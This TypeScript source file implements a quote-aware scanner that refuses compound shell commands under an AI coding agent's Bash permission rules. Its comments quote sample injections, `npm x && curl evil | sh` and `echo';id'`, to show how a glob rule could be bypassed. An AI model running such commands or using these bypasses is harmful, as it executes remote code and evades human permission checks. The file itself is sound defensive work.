import type { ResolvedShell } from '../types/runtime.js';

/**
 * Shell characters that chain, redirect, substitute or group one command into another, and a
 * newline, which starts a second command.
 *
 * A `Bash(<glob>)` rule is a glob over the whole command string and `*` crosses anything, so
 * `Bash(npm *)` would also match `npm x && curl evil | sh`. Book cannot express "and nothing else"
 * in its glob language and does not parse shell, so it asks a smaller question with
 * {@link hasCompoundShellSyntax}: does the command contain shell syntax that could run something
 * other than the one command the rule was written for? Two places use the answer:
 *
 * - the capability layer (`allowed-tools` of a command, skill or agent role) refuses a compound
 *   command under a `Bash(<glob>)` rule, so the model sends each command as its own call;
 * - the permission layer admits a call through a `Bash(<pattern>)` allow rule only when the whole
 *   command, trimmed, matches the pattern and is not compound; a compound command falls through to
 *   the normal prompt.
 *
 * The check is quote-aware, but it is a small quote scanner and not a shell parser. A character
 * that chains outside quotes (`;`, `&`, `|`, `<`, `>`, `(`, `)`, `{`, `}`, `$`, a backtick) is
 * literal inside quotes, so `git commit -m "fix(x): y"` is one command. `$` and a backtick still
 * count inside double quotes, where a shell substitutes, and a line break counts everywhere.
 *
 * It stays conservative across sh/bash, PowerShell and cmd.exe: whatever any of them could read as
 * something other than a quote refuses the command (a backslash or caret before a quote, a
 * typographic quote, an unterminated quote). On Windows any single quote refuses the command unless
 * the session shell is known to be Git Bash and the command reaches it wrapped (see
 * {@link ScanShell} and {@link hasCompoundShellSyntax}): cmd.exe has no single quote, but the
 * Windows session shell is usually PowerShell or Git Bash, which both read it as a real one, and
 * only Git Bash reads it as sh does, so for any other shell the scanner cannot tell which
 * characters are quoted.
 *
 * The "Always allow" ladder (`permissionRuleLadder`) stays quote-blind on purpose and uses
 * {@link SHELL_CHAINING} raw: a tokenizer that knew quotes would offer rungs with a dangling quote.
 */
export const SHELL_CHAINING = /[;&|><`$(){}\n]/;

/** Line breaks in any shell: LF, CR, NEL, and the Unicode line and paragraph separators. */
export const LINE_BREAK = /[\n\r\u0085\u2028\u2029]/;

/** Typographic quotes U+2018 to U+201E, which PowerShell reads as quote characters. */
const TYPOGRAPHIC_QUOTE_RANGE = '\\u2018-\\u201E';

const TYPOGRAPHIC_QUOTE = new RegExp(`[${TYPOGRAPHIC_QUOTE_RANGE}]`);

/** Every character that can open or close a quote in some shell. */
export const ANY_QUOTE = new RegExp(`['"${TYPOGRAPHIC_QUOTE_RANGE}]`);

/**
 * The part of the session shell the scanner reads: `ResolvedShell.kind` and `file`. Git Bash is
 * `kind: 'bash'` with a `file`: `shellExecution` sends a `bash` kind without one to Node's
 * `shell: true`, which is cmd.exe on Windows.
 */
export type ScanShell = Pick<ResolvedShell, 'kind' | 'file'>;

/**
 * Directories that hold WSL's `bash.exe` launcher, which `kindFromExecutable` also calls `bash`
 * (any executable name containing "bash"). It is not the MSYS runtime and rebuilds argv its own
 * way, so it is not Git Bash here. Either slash, any case.
 */
const WINDOWS_SYSTEM_DIRECTORY = /[\\/]windows[\\/](?:system32|syswow64|sysnative)[\\/]/i;

/**
 * Whether the session shell is Git Bash, the one Windows shell that quotes with `'` as sh does:
 * `kind: 'bash'` with a `file` (a `bash` without one is cmd.exe through `shell: true`), and the
 * file is not WSL's launcher in a Windows system directory.
 */
function isGitBash(shell: ScanShell | undefined): boolean {
  return (
    shell?.kind === 'bash' &&
    Boolean(shell.file) &&
    !WINDOWS_SYSTEM_DIRECTORY.test(shell.file ?? '')
  );
}

/**
 * Whether Git Bash's argument rebuilding leaves a command's single quotes alone. The Bash tool
 * spawns Git Bash as `[file, '-c', command]`, and two mechanisms decide what bash receives:
 *
 * - libuv (`quote_cmd_arg`, no `windowsVerbatimArguments`) writes an argument on the Windows
 *   command line unquoted when it holds no space, tab or `"`, and otherwise wraps it in `"…"`,
 *   escaping each `"` as `\"`;
 * - the MSYS runtime rebuilds argv from that command line itself when its parent is not an MSYS
 *   process (`build_argv` in `winsup/cygwin/dcrt0.cc`). In an unwrapped word it reads `'` as a
 *   quote and `globify` strips the quotes, so `echo';id'` reaches bash as `echo;id`: two commands
 *   the scanner took for one. Inside a `"…"`-wrapped word `'` is literal and arrives intact.
 *
 * So `'` reads as a POSIX quote only when the trimmed command has a space, a tab or a `"`, which
 * makes libuv wrap it.
 */
function singleQuotesSurviveGitBash(trimmed: string): boolean {
  return /[ \t"]/.test(trimmed);
}

/**
 * Whether a command contains shell syntax a `Bash(<pattern>)` rule cannot vouch for, so it must be
 * refused or asked about. Surrounding whitespace is not part of the command (the Bash tool runs
 * `command.trim()`), so it is trimmed first. One left-to-right scan, in one of three states:
 * outside quotes, inside single quotes, inside double quotes. True when:
 *
 * - outside quotes, any {@link SHELL_CHAINING} character appears;
 * - inside double quotes, `$` or a backtick appears (every other character is literal);
 * - inside single quotes, nothing is special;
 * - a quote is still open at the end;
 * - a line break appears in any state: in sh `#` can comment out an opening quote, and PowerShell
 *   reads a bare CR as a line break, so no quote state can be trusted across one;
 * - a backslash comes right before `'` or `"` in any state, single quotes included: sh reads it as
 *   a literal quote outside single quotes, PowerShell and cmd.exe read `\"` as a closing quote, and
 *   fish reads `\'` inside single quotes as an escaped quote. The `shell` setting can name any
 *   executable (an unknown one is treated as `sh`), so the scanner cannot tell which characters are
 *   quoted;
 * - a caret comes right before `'` or `"` outside quotes: `^` escapes the quote in cmd.exe;
 * - a typographic quote appears anywhere;
 * - on `win32`, an ASCII `'` appears anywhere, unless `shell` is Git Bash and the trimmed command
 *   contains a space, a tab or a `"`: then `'` is a POSIX single quote exactly as on Linux. A
 *   command with none of those reaches the MSYS runtime unwrapped, which strips its quotes (see
 *   {@link singleQuotesSurviveGitBash}), so it keeps being refused, as does every other case on
 *   win32 (cmd, pwsh, powershell, sh, a `bash` without a file or WSL's launcher, no shell known).
 *   Off win32 `shell` is not read.
 *
 * Every caller passes the same (platform, shell) pair, so the permission gate, the capability gate
 * and the refusal text agree about which commands are compound.
 */
export function hasCompoundShellSyntax(
  command: string,
  platform: NodeJS.Platform = process.platform,
  shell?: ScanShell,
): boolean {
  const text = command.trim();
  const refusesSingleQuote =
    platform === 'win32' && !(isGitBash(shell) && singleQuotesSurviveGitBash(text));
  let state: 'outside' | 'single' | 'double' = 'outside';

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (LINE_BREAK.test(char) || TYPOGRAPHIC_QUOTE.test(char)) return true;
    if (refusesSingleQuote && char === "'") return true;

    const next = text[i + 1];
    const quoteFollows = next === '"' || next === "'";
    if (char === '\\' && quoteFollows) return true;

    if (state === 'single') {
      if (char === "'") state = 'outside';
      continue;
    }

    if (state === 'double') {
      if (char === '$' || char === '`') return true;
      if (char === '"') state = 'outside';
      continue;
    }

    if (char === '^' && quoteFollows) return true;
    if (char === '"') state = 'double';
    else if (char === "'") state = 'single';
    else if (SHELL_CHAINING.test(char)) return true;
  }

  return state !== 'outside';
}
